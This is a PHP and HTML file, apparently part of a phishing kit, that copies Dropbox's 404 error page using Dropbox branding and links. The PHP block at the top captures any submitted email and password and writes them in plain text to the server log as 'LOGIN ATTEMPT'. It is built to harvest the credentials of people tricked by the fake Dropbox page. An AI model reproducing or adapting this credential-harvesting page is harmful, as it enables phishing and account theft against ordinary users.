<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';

    // Log credentials to the error log
    error_log("LOGIN ATTEMPT: Email: $email | Password: $password");
}
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Dropbox - 404</title>
<link href="Dropbox%20-%20404_files/error.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="https://cfl.dropboxstatic.com/static/images/favicon.ico">
</head>
<body>
<div class="figure">
<img src="Dropbox%20-%20404_files/look-magnifying-glass.svg" alt="Error: 404">
</div>
<div id="errorbox">
<div class="not-found"> <h1>Error (404)</h1> We can't find the page you're looking for. <div class="not-found--links"> Here are a few links that may be helpful: <ul> <li><a href="https://dash.dropbox.com/">Home</a></li> <li><a href="https://sign.dropbox.com/">Help center</a></li> <li><a href="https://dash.dropbox.com/">Sign in</a></li> <li><a href="https://dash.dropbox.com/">Get a free account</a></li> <li><a href="https://sign.dropbox.com/">Dropbox Plus</a></li> <li><a href="https://dash.dropbox.com/">Dropbox Business</a></li> </ul> </div> </div>
</div>



</body></html>